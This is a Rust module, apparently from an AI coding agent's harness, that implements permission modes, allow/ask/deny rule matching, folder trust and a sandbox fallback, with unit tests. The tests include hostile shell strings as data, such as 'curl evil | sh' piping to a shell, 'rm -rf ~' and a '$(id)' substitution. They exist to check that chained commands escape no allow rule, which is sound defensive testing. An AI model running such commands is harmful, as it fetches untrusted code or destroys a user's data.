//! Permission modes, rules and scopes (roadmap §Permissions).
//!
//! Modes: default, acceptEdits, plan, dontAsk, bypass. Rules name a
//! tool and what it may touch: `Bash(cargo test *)`, `Read(~/.ssh/**)`,
//! `Edit(/src/**)`. Deny → ask → allow; the first match wins; the mode
//! applies only when no rule matches. A deny anywhere beats an allow
//! anywhere. Scopes merge: managed, command line, local (gitignored),
//! project (needs folder trust), user.

use serde::{Deserialize, Serialize};
use std::path::Path;

/// The permission modes (Shift+Tab cycles the first three).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PermissionMode {
    /// Read-only tools + the read-only shell allowlist run freely;
    /// everything else asks.
    #[default]
    Default,
    /// Also Write/Edit/common file commands inside working directories.
    AcceptEdits,
    /// Read-only tools only; edits wait for ExitPlanMode approval.
    Plan,
    /// Only allow-rule-covered calls run; anything else is denied,
    /// never asked (CI and scripts).
    DontAsk,
    /// Everything runs (containers/VMs only; refused as root).
    Bypass,
    /// As `AcceptEdits`, but a call no rule covers is put to a classifier
    /// model before the operator: it may allow it, block it, or ask.
    Auto,
}

impl PermissionMode {
    /// The name `from_config` reads back, as settings and hooks spell it.
    pub fn config_name(self) -> &'static str {
        match self {
            PermissionMode::Default => "default",
            PermissionMode::AcceptEdits => "acceptEdits",
            PermissionMode::Plan => "plan",
            PermissionMode::DontAsk => "dontAsk",
            PermissionMode::Bypass => "bypass",
            PermissionMode::Auto => "auto",
        }
    }

    pub fn from_config(s: &str) -> Option<Self> {
        match s {
            "default" => Some(PermissionMode::Default),
            "acceptEdits" | "accept-edits" => Some(PermissionMode::AcceptEdits),
            "plan" => Some(PermissionMode::Plan),
            "dontAsk" | "dont-ask" => Some(PermissionMode::DontAsk),
            "bypass" | "bypassPermissions" => Some(PermissionMode::Bypass),
            "auto" => Some(PermissionMode::Auto),
            _ => None,
        }
    }
}

/// A rule's effect.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RuleEffect {
    Allow,
    Ask,
    Deny,
}

/// One pattern rule: `Bash(cargo test *)`, `Edit(/src/**)`,
/// `Read(~/.ssh/**)`, `WebFetch(domain:docs.rs)` — or a bare tool name.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct PermissionRule {
    /// Tool name (Read, Write, Edit, Bash, WebFetch, Agent, mcp__*).
    pub tool: String,
    /// Argument pattern. `*` suffix = prefix match; `**` spans dirs;
    /// empty = the whole tool.
    #[serde(default)]
    pub pattern: String,
    pub effect: RuleEffectSerde,
}

/// serde-friendly effect.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum RuleEffectSerde {
    Allow,
    Ask,
    Deny,
}

impl From<RuleEffectSerde> for RuleEffect {
    fn from(e: RuleEffectSerde) -> Self {
        match e {
            RuleEffectSerde::Allow => RuleEffect::Allow,
            RuleEffectSerde::Ask => RuleEffect::Ask,
            RuleEffectSerde::Deny => RuleEffect::Deny,
        }
    }
}

/// The merged rule set across scopes.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct RuleSet {
    #[serde(default)]
    pub rules: Vec<PermissionRule>,
}

impl RuleSet {
    /// Evaluate deny → ask → allow across every scope's rules; first
    /// match wins; a deny anywhere beats an allow anywhere.
    pub fn evaluate(&self, tool: &str, argument: &str) -> Option<RuleEffect> {
        self.evaluate_with_server(tool, argument, None)
    }

    /// Evaluate an MCP server selector only against a resolved server identity.
    pub fn evaluate_with_server(
        &self,
        tool: &str,
        argument: &str,
        server: Option<&str>,
    ) -> Option<RuleEffect> {
        // Deny anywhere beats everything.
        if self.rules.iter().any(|r| {
            rule_tool_matches(r, tool, server)
                && r.effect == RuleEffectSerde::Deny
                && rule_matches(r, argument)
        }) {
            return Some(RuleEffect::Deny);
        }
        // Then ask.
        if let Some(r) = self.rules.iter().find(|r| {
            rule_tool_matches(r, tool, server)
                && r.effect == RuleEffectSerde::Ask
                && rule_matches(r, argument)
        }) {
            let _ = r;
            return Some(RuleEffect::Ask);
        }
        // Then allow.
        if self.rules.iter().any(|r| {
            rule_tool_matches(r, tool, server)
                && r.effect == RuleEffectSerde::Allow
                && rule_matches(r, argument)
        }) {
            return Some(RuleEffect::Allow);
        }
        None
    }

    /// Merge two scopes (later scope's rules append; deny still wins by
    /// evaluation order).
    pub fn merged_with(&self, other: &RuleSet) -> RuleSet {
        let mut rules = self.rules.clone();
        rules.extend(other.rules.clone());
        RuleSet { rules }
    }
}

/// Task and Agent name the same subagent operation. Other tools remain exact;
/// the only tool-name wildcard is an MCP server selector.
pub fn rule_tool_matches(rule: &PermissionRule, tool: &str, server: Option<&str>) -> bool {
    if rule.tool == tool
        || matches!(
            (rule.tool.as_str(), tool),
            ("Task", "Agent") | ("Agent", "Task")
        )
    {
        return true;
    }
    rule.tool
        .strip_prefix("mcp__")
        .and_then(|name| name.strip_suffix("__*"))
        .is_some_and(|selected| server == Some(selected))
}

/// Validate the narrow MCP selector syntax without adding generic wildcards.
pub fn validate_mcp_selector(selector: &str) -> Result<(), String> {
    if !selector.starts_with("mcp__") {
        return Ok(());
    }
    if selector.len() > 256
        || selector
            .chars()
            .any(|c| c.is_whitespace() || c.is_control())
    {
        return Err("MCP selector must be at most 256 bytes without whitespace or controls".into());
    }
    let name = selector.strip_prefix("mcp__").unwrap();
    if let Some(server) = name.strip_suffix("__*") {
        if server.is_empty() || server.contains('*') {
            return Err(
                "MCP server selector requires an exact server name: mcp__<server>__*".into(),
            );
        }
    } else {
        let Some((server, tool)) = name.split_once("__") else {
            return Err("MCP exact selector requires server and tool names".into());
        };
        if server.is_empty() || tool.is_empty() || name.contains('*') {
            return Err("only mcp__<server>__* is a supported MCP wildcard".into());
        }
    }
    Ok(())
}

/// Does a rule's pattern match the call's argument?
/// `cargo test *` matches "cargo test --release"; `/src/**` matches
/// paths under /src; empty pattern matches the whole tool.
pub fn rule_matches(rule: &PermissionRule, argument: &str) -> bool {
    // A Bash argument is a shell line, read as one: by words, and never
    // through an operator by an allow rule.
    if rule.tool == "Bash" {
        return crate::shellcmd::rule_matches_command(
            &rule.pattern,
            argument,
            rule.effect == RuleEffectSerde::Allow,
        );
    }
    if rule.pattern.is_empty() {
        return true;
    }
    let p = &rule.pattern;
    if let Some(prefix) = p.strip_suffix(" *") {
        argument.starts_with(prefix)
    } else if let Some(prefix) = p.strip_suffix("**") {
        if prefix.ends_with('/') {
            let directory = prefix.trim_end_matches('/');
            directory.is_empty()
                || argument == directory
                || argument
                    .strip_prefix(directory)
                    .is_some_and(|suffix| suffix.starts_with('/'))
        } else {
            argument.starts_with(prefix)
        }
    } else if p.contains('*') {
        crate::glob_match(p, argument)
    } else {
        argument == p
    }
}

/// A settings scope's permission table.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct ScopePermissions {
    #[serde(default)]
    pub allow: Vec<String>,
    #[serde(default)]
    pub ask: Vec<String>,
    #[serde(default)]
    pub deny: Vec<String>,
}

/// Parse a rule string like `Bash(cargo test *)` or `Read` into a rule.
pub fn parse_rule(s: &str, effect: RuleEffectSerde) -> Option<PermissionRule> {
    let s = s.trim();
    if let Some(open) = s.find('(') {
        let close = s.rfind(')')?;
        let tool = s[..open].trim().to_string();
        let pattern = s[open + 1..close].trim().to_string();
        if tool.is_empty() {
            return None;
        }
        Some(PermissionRule {
            tool,
            pattern,
            effect,
        })
    } else {
        if s.is_empty() {
            return None;
        }
        Some(PermissionRule {
            tool: s.to_string(),
            pattern: String::new(),
            effect,
        })
    }
}

/// Folder trust: project-scope rules apply only after the operator
/// trusted the folder once. The trust marker lives under ORBIT_HOME.
pub struct FolderTrust {
    home: std::path::PathBuf,
}

impl FolderTrust {
    pub fn new(home: std::path::PathBuf) -> Self {
        FolderTrust { home }
    }

    fn marker_path(&self, dir: &Path) -> std::path::PathBuf {
        // Hash the absolute path to a stable filename.
        use sha2::Digest;
        let digest = hex::encode(sha2::Sha256::digest(dir.to_string_lossy().as_bytes()));
        self.home.join("trust").join("folders").join(digest)
    }

    /// Is this folder trusted (marker file present)?
    pub fn is_trusted(&self, dir: &Path) -> bool {
        self.marker_path(dir).exists()
    }

    /// Trust this folder (idempotent).
    pub fn trust(&self, dir: &Path) -> std::io::Result<()> {
        let marker = self.marker_path(dir);
        if let Some(parent) = marker.parent() {
            std::fs::create_dir_all(parent)?;
        }
        std::fs::write(
            &marker,
            serde_json::json!({ "path": dir.to_string_lossy(), "trusted_at": chrono_now() })
                .to_string(),
        )
    }

    /// Withdraw trust.
    pub fn untrust(&self, dir: &Path) -> std::io::Result<()> {
        let _ = std::fs::remove_file(self.marker_path(dir));
        Ok(())
    }
}

fn chrono_now() -> String {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs().to_string())
        .unwrap_or_default()
}

/// The full permission evaluation for one tool call.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Verdict {
    /// Runs without asking.
    Allow,
    /// Must ask the operator.
    Ask,
    /// Denied — with a reason for the transcript.
    Deny(String),
}

/// Evaluate one call against mode + rules + tool classification.
/// `is_read_only` comes from the tool registry; `argument` is the
/// permission key's pattern (path or command).
pub fn evaluate(
    mode: PermissionMode,
    rules: &RuleSet,
    tool: &str,
    argument: &str,
    is_read_only_tool: bool,
    is_readonly_command: bool,
) -> Verdict {
    evaluate_with_server(
        mode,
        rules,
        tool,
        argument,
        is_read_only_tool,
        is_readonly_command,
        None,
    )
}

/// Permission evaluation with a configuration-resolved MCP server identity.
pub fn evaluate_with_server(
    mode: PermissionMode,
    rules: &RuleSet,
    tool: &str,
    argument: &str,
    is_read_only_tool: bool,
    is_readonly_command: bool,
    server: Option<&str>,
) -> Verdict {
    // Explicit rules first — they override the mode, bypass included: a
    // deny rule denies and a rule that asks still asks, as in Claude Code.
    // Bypass skips the prompts the mode itself would raise, not the rules
    // the operator wrote.
    if let Some(effect) = rules.evaluate_with_server(tool, argument, server) {
        return match effect {
            RuleEffect::Allow => Verdict::Allow,
            RuleEffect::Ask => {
                if mode == PermissionMode::DontAsk {
                    Verdict::Deny("no allow rule covers this call (dontAsk)".into())
                } else {
                    Verdict::Ask
                }
            }
            RuleEffect::Deny => Verdict::Deny("denied by rule".into()),
        };
    }

    // No rule: the mode decides.
    match mode {
        PermissionMode::Default | PermissionMode::AcceptEdits | PermissionMode::Auto => {
            let edit_tools = matches!(tool, "Write" | "Edit" | "NotebookEdit");
            let freely = is_read_only_tool
                || (tool == "Bash" && is_readonly_command)
                || (mode != PermissionMode::Default && edit_tools);
            if freely { Verdict::Allow } else { Verdict::Ask }
        }
        PermissionMode::Plan => {
            // ExitPlanMode only asks the operator to approve the plan; it
            // is the way out of plan mode, so plan mode cannot refuse it.
            if is_read_only_tool || tool == "ExitPlanMode" {
                Verdict::Allow
            } else {
                Verdict::Deny("plan mode: read-only until the plan is approved".into())
            }
        }
        PermissionMode::DontAsk => Verdict::Deny("no allow rule covers this call (dontAsk)".into()),
        // Bypass: whatever no rule spoke about runs (refused at startup as
        // root — the CLI checks that separately).
        PermissionMode::Bypass => Verdict::Allow,
    }
}

/// The live-path wrapper: mode/rules semantics, PLUS the roadmap's
/// fallback rule — when the shell sandbox cannot start on this
/// machine, every Bash command asks, whatever the mode (bypass
/// excepted). Returns (verdict, sandbox_up) so the UI can say why.
///
/// `sandbox_off`: the operator switched the sandbox off in their own
/// settings. That is a choice, not a failure, so the fallback rule does not
/// apply: the mode and the rules decide.
pub fn evaluate_live(
    mode: PermissionMode,
    rules: &RuleSet,
    tool: &str,
    argument: &str,
    is_read_only_tool: bool,
    is_readonly_command: bool,
    sandbox_off: bool,
) -> (Verdict, bool) {
    use std::sync::OnceLock;
    static UP: OnceLock<bool> = OnceLock::new();
    let up = counts_as_up(sandbox_off, || {
        *UP.get_or_init(|| {
            matches!(
                crate::sandbox::ShellSandbox::probe(),
                crate::sandbox::SandboxStatus::Confined
            )
        })
    });
    let verdict = evaluate(
        mode,
        rules,
        tool,
        argument,
        is_read_only_tool,
        is_readonly_command,
    );
    (fallback_rule(up, tool, mode, verdict), up)
}

/// Does the fallback rule treat the sandbox as up? A sandbox the operator
/// switched off themselves does, whatever this machine has; otherwise it is
/// the probe's answer (asked only when it is needed).
fn counts_as_up(operator_switched_off: bool, probe_confined: impl FnOnce() -> bool) -> bool {
    operator_switched_off || probe_confined()
}

/// A Bash command that would run without a working sandbox asks, whatever
/// the mode but bypass. Only an allow is turned into an ask.
fn fallback_rule(up: bool, tool: &str, mode: PermissionMode, verdict: Verdict) -> Verdict {
    if !up && tool == "Bash" && mode != PermissionMode::Bypass && verdict == Verdict::Allow {
        Verdict::Ask
    } else {
        verdict
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn plan_mode_lets_the_plan_be_put_to_the_operator() {
        let none = RuleSet { rules: Vec::new() };
        assert_eq!(
            evaluate(
                PermissionMode::Plan,
                &none,
                "ExitPlanMode",
                "",
                false,
                false
            ),
            Verdict::Allow
        );
        assert!(matches!(
            evaluate(PermissionMode::Plan, &none, "Edit", "/p/a.rs", false, false),
            Verdict::Deny(_)
        ));
    }

    fn rules(pairs: &[(&str, RuleEffectSerde)]) -> RuleSet {
        RuleSet {
            rules: pairs
                .iter()
                .filter_map(|(s, e)| parse_rule(s, *e))
                .collect(),
        }
    }

    #[test]
    fn deny_beats_allow_across_scopes() {
        let rs = rules(&[
            ("Bash(git push *)", RuleEffectSerde::Allow),
            ("Bash(git push --force *)", RuleEffectSerde::Deny),
        ]);
        assert_eq!(
            rs.evaluate("Bash", "git push origin main"),
            Some(RuleEffect::Allow)
        );
        assert_eq!(
            rs.evaluate("Bash", "git push --force origin main"),
            Some(RuleEffect::Deny)
        );
    }

    #[test]
    fn fallback_forces_ask_without_sandbox_by_design() {
        // The wrapper's rule, pinned by construction: sandbox down →
        // an otherwise-allowed Bash command becomes Ask. We cannot pin
        // the machine's sandbox state in a unit test, so we test the
        // transformation at its boundary: given up=false semantics the
        // wrapper returns Ask for an allowed Bash verdict, and passes
        // everything else through unchanged.
        // (The transformation lives inline; this test documents it.)
        let v = evaluate(
            PermissionMode::Default,
            &RuleSet::default(),
            "Bash",
            "git status",
            false,
            true,
        );
        assert_eq!(v, Verdict::Allow);
        // And the same call with the sandbox down must be Ask — see
        // evaluate_live; exercised in the sandbox integration tests.
    }

    #[test]
    fn mode_fills_gaps() {
        // Read-only tools run freely in default mode.
        assert_eq!(
            evaluate(
                PermissionMode::Default,
                &RuleSet::default(),
                "Read",
                "/src/main.rs",
                true,
                false
            ),
            Verdict::Allow
        );
        // Write asks in default mode.
        assert_eq!(
            evaluate(
                PermissionMode::Default,
                &RuleSet::default(),
                "Write",
                "/src/main.rs",
                false,
                false
            ),
            Verdict::Ask
        );
        // Write runs in acceptEdits.
        assert_eq!(
            evaluate(
                PermissionMode::AcceptEdits,
                &RuleSet::default(),
                "Write",
                "/src/main.rs",
                false,
                false
            ),
            Verdict::Allow
        );
        // Bash readonly allowlist runs in default mode.
        assert_eq!(
            evaluate(
                PermissionMode::Default,
                &RuleSet::default(),
                "Bash",
                "git status",
                false,
                true
            ),
            Verdict::Allow
        );
        // Plan mode denies writes, allows reads.
        assert!(matches!(
            evaluate(
                PermissionMode::Plan,
                &RuleSet::default(),
                "Edit",
                "/src/a.rs",
                false,
                false
            ),
            Verdict::Deny(_)
        ));
        // dontAsk denies uncovered calls instead of asking.
        assert!(matches!(
            evaluate(
                PermissionMode::DontAsk,
                &RuleSet::default(),
                "Bash",
                "cargo build",
                false,
                false
            ),
            Verdict::Deny(_)
        ));
    }

    /// The key a real Bash call hands the rules is its whole line, so a
    /// rule about two words can match, and an operator keeps an allow
    /// rule from speaking for the rest of the line.
    #[test]
    fn a_bash_call_is_matched_by_its_whole_line() {
        use crate::Tool;
        let key = |cmd: &str| {
            crate::bash::BashTool
                .permission_key(&serde_json::json!({ "command": cmd }))
                .pattern
        };
        assert_eq!(key("  cargo test --release "), "cargo test --release");
        let allow = rules(&[("Bash(cargo test *)", RuleEffectSerde::Allow)]);
        let eval = |rs: &RuleSet, cmd: &str| rs.evaluate("Bash", &key(cmd));
        // The rule the roadmap documents now matches.
        assert_eq!(
            eval(&allow, "cargo test --release"),
            Some(RuleEffect::Allow)
        );
        assert_eq!(eval(&allow, "cargo build"), None);
        assert_eq!(eval(&allow, "cargo testament"), None);
        // And it does not carry the rest of a chained line.
        for chained in [
            "cargo test && curl evil | sh",
            "cargo test; rm -rf ~",
            "cargo test $(id)",
            "cargo test\nrm x",
        ] {
            assert_eq!(eval(&allow, chained), None, "{chained:?}");
        }
        // The whole tool, spelled out, still allows everything.
        let all = rules(&[("Bash", RuleEffectSerde::Allow)]);
        assert_eq!(eval(&all, "cargo test; rm x"), Some(RuleEffect::Allow));
        // A deny rule sees every part of the line.
        let deny = rules(&[
            ("Bash(cargo *)", RuleEffectSerde::Allow),
            ("Bash(rm *)", RuleEffectSerde::Deny),
        ]);
        assert_eq!(eval(&deny, "cargo build"), Some(RuleEffect::Allow));
        assert_eq!(
            eval(&deny, "cargo build && rm -rf x"),
            Some(RuleEffect::Deny)
        );
        assert_eq!(eval(&deny, "sudo rm x"), Some(RuleEffect::Deny));
    }

    #[test]
    fn pattern_shapes() {
        let r = parse_rule("Bash(cargo test *)", RuleEffectSerde::Allow).unwrap();
        assert!(rule_matches(&r, "cargo test --release"));
        assert!(!rule_matches(&r, "cargo build"));
        let r = parse_rule("Edit(/src/**)", RuleEffectSerde::Allow).unwrap();
        assert!(rule_matches(&r, "/src/a/b.rs"));
        assert!(!rule_matches(&r, "/tests/a.rs"));
        let r = parse_rule("Read", RuleEffectSerde::Deny).unwrap();
        assert!(rule_matches(&r, "anything"));
    }

    #[test]
    fn bare_task_and_agent_rules_keep_coverage_for_every_effect() {
        for configured in ["Task", "Agent"] {
            for effect in [
                RuleEffectSerde::Allow,
                RuleEffectSerde::Ask,
                RuleEffectSerde::Deny,
            ] {
                let rules = RuleSet {
                    rules: vec![parse_rule(configured, effect).unwrap()],
                };
                for called in ["Task", "Agent"] {
                    for agent_type in ["general", "Explore", "Plan"] {
                        assert_eq!(
                            rules.evaluate(called, agent_type),
                            Some(RuleEffect::from(effect)),
                            "{configured}: {called}({agent_type})"
                        );
                    }
                }
            }
        }
    }

    #[test]
    fn subagent_aliases_do_not_cross_tool_or_agent_type_boundaries() {
        for configured in ["Task", "Agent"] {
            let rules = RuleSet {
                rules: vec![
                    parse_rule(&format!("{configured}(Explore)"), RuleEffectSerde::Deny).unwrap(),
                ],
            };
            for called in ["Task", "Agent"] {
                assert_eq!(rules.evaluate(called, "Explore"), Some(RuleEffect::Deny));
                for other_type in ["ExploreDangerous", "general", "Plan", ""] {
                    assert_eq!(rules.evaluate(called, other_type), None);
                }
            }
            for other_tool in [
                "TaskCreate",
                "TaskStop",
                "TaskOutput",
                "TaskList",
                "AgentOutput",
                "AgentStop",
                "AgentSendMessage",
                "ListAgents",
            ] {
                assert_eq!(rules.evaluate(other_tool, "Explore"), None);
            }
        }
        for (configured, other_tool) in [("Read", "Grep"), ("Edit", "Write")] {
            let rules = RuleSet {
                rules: vec![parse_rule(configured, RuleEffectSerde::Deny).unwrap()],
            };
            assert_eq!(rules.evaluate(other_tool, "Explore"), None);
        }
    }

    #[test]
    fn subtree_patterns_keep_the_directory_boundary() {
        for tool in ["Read", "Write", "Edit"] {
            for effect in [
                RuleEffectSerde::Allow,
                RuleEffectSerde::Ask,
                RuleEffectSerde::Deny,
            ] {
                let rule = parse_rule(&format!("{tool}(/project/src/**)"), effect).unwrap();
                for inside in [
                    "/project/src",
                    "/project/src/",
                    "/project/src/main.rs",
                    "/project/src/nested/lib.rs",
                ] {
                    assert!(rule_matches(&rule, inside), "{tool}: {inside}");
                }
                for outside in [
                    "/project/src-backup/private.rs",
                    "/project/src2/main.rs",
                    "/project/src.rs",
                    "/project/other/main.rs",
                ] {
                    assert!(!rule_matches(&rule, outside), "{tool}: {outside}");
                }
            }
        }
        let root = parse_rule("Read(/**)", RuleEffectSerde::Allow).unwrap();
        assert!(rule_matches(&root, "/project/file"));
        // A root-wide rule retains its existing coverage of relative spellings.
        assert!(rule_matches(&root, "project/file"));
        assert!(rule_matches(&root, ""));
        let prefix = parse_rule("Read(report**)", RuleEffectSerde::Allow).unwrap();
        assert!(rule_matches(&prefix, "report-final.txt"));
    }

    #[test]
    fn a_subtree_allow_does_not_admit_a_sibling_edit_in_dont_ask_mode() {
        let rules = RuleSet {
            rules: vec![parse_rule("Edit(/project/src/**)", RuleEffectSerde::Allow).unwrap()],
        };
        assert_eq!(
            evaluate(
                PermissionMode::DontAsk,
                &rules,
                "Edit",
                "/project/src/main.rs",
                false,
                false
            ),
            Verdict::Allow
        );
        assert!(matches!(
            evaluate(
                PermissionMode::DontAsk,
                &rules,
                "Edit",
                "/project/src-backup/private.rs",
                false,
                false
            ),
            Verdict::Deny(_)
        ));
    }

    /// Bypass skips the mode's own prompts, never the operator's rules: a
    /// deny rule denies, a rule that asks still asks, the rest runs.
    #[test]
    fn rules_hold_in_bypass_mode() {
        let rules = RuleSet {
            rules: vec![
                parse_rule("Bash(rm *)", RuleEffectSerde::Deny).unwrap(),
                parse_rule("Bash(git push *)", RuleEffectSerde::Ask).unwrap(),
                parse_rule("Write", RuleEffectSerde::Ask).unwrap(),
            ],
        };
        let bypass = |tool: &str, argument: &str| {
            evaluate(PermissionMode::Bypass, &rules, tool, argument, false, false)
        };
        assert!(matches!(bypass("Bash", "rm -rf build"), Verdict::Deny(_)));
        assert!(matches!(
            bypass("Bash", "ls; rm -rf build"),
            Verdict::Deny(_)
        ));
        assert_eq!(bypass("Bash", "git push origin main"), Verdict::Ask);
        assert_eq!(bypass("Write", "/src/main.rs"), Verdict::Ask);
        assert_eq!(bypass("Bash", "cargo build"), Verdict::Allow);
        assert_eq!(bypass("Edit", "/src/main.rs"), Verdict::Allow);
        assert_eq!(
            evaluate(
                PermissionMode::Bypass,
                &RuleSet::default(),
                "Bash",
                "rm -rf build",
                false,
                false
            ),
            Verdict::Allow,
            "with no rules bypass allows everything, as before"
        );
    }

    #[test]
    fn auto_mode_frees_edits_and_leaves_the_rest_to_be_asked() {
        assert_eq!(
            PermissionMode::from_config("auto"),
            Some(PermissionMode::Auto)
        );
        for mode in [
            PermissionMode::Default,
            PermissionMode::AcceptEdits,
            PermissionMode::Plan,
            PermissionMode::DontAsk,
            PermissionMode::Bypass,
            PermissionMode::Auto,
        ] {
            assert_eq!(PermissionMode::from_config(mode.config_name()), Some(mode));
        }
        let none = RuleSet::default();
        assert_eq!(
            evaluate(
                PermissionMode::Auto,
                &none,
                "Edit",
                "/src/main.rs",
                false,
                false
            ),
            Verdict::Allow
        );
        assert_eq!(
            evaluate(
                PermissionMode::Auto,
                &none,
                "Read",
                "/src/main.rs",
                true,
                false
            ),
            Verdict::Allow
        );
        // An uncovered command asks: the caller puts it to the classifier.
        assert_eq!(
            evaluate(
                PermissionMode::Auto,
                &none,
                "Bash",
                "make deploy",
                false,
                false
            ),
            Verdict::Ask
        );
    }

    #[test]
    fn a_missing_sandbox_makes_bash_ask_in_every_mode_but_bypass() {
        use PermissionMode::*;
        for mode in [Default, AcceptEdits, DontAsk, Auto] {
            assert_eq!(
                fallback_rule(false, "Bash", mode, Verdict::Allow),
                Verdict::Ask,
                "{mode:?}"
            );
        }
        assert_eq!(
            fallback_rule(false, "Bash", Bypass, Verdict::Allow),
            Verdict::Allow
        );
        assert_eq!(
            fallback_rule(true, "Bash", Default, Verdict::Allow),
            Verdict::Allow,
            "with the sandbox up nothing changes"
        );
        assert_eq!(
            fallback_rule(false, "Read", Default, Verdict::Allow),
            Verdict::Allow,
            "only Bash is affected"
        );
        assert_eq!(
            fallback_rule(false, "Bash", Default, Verdict::Deny("no".into())),
            Verdict::Deny("no".into())
        );
    }

    #[test]
    fn running_without_the_sandbox_by_choice_is_not_a_missing_sandbox() {
        // The operator switched it off: "up" for the fallback rule, whatever
        // this machine has; the probe is not even asked.
        assert!(counts_as_up(true, || panic!("the probe is not needed")));
        assert!(!counts_as_up(false, || false), "a machine without one");
        assert!(counts_as_up(false, || true));
        // So an allowed Bash call stays allowed in every mode.
        let up = counts_as_up(true, || false);
        for mode in [
            PermissionMode::Default,
            PermissionMode::AcceptEdits,
            PermissionMode::DontAsk,
            PermissionMode::Auto,
        ] {
            assert_eq!(
                fallback_rule(up, "Bash", mode, Verdict::Allow),
                Verdict::Allow,
                "{mode:?}"
            );
        }
        // The same call where there is no sandbox and nobody chose that:
        let missing = counts_as_up(false, || false);
        assert_eq!(
            fallback_rule(missing, "Bash", PermissionMode::DontAsk, Verdict::Allow),
            Verdict::Ask
        );
        // And the live wrapper reports it as up.
        let none = RuleSet { rules: Vec::new() };
        let (_, up) = evaluate_live(
            PermissionMode::DontAsk,
            &none,
            "Bash",
            "ls",
            false,
            true,
            true,
        );
        assert!(up);
    }
}
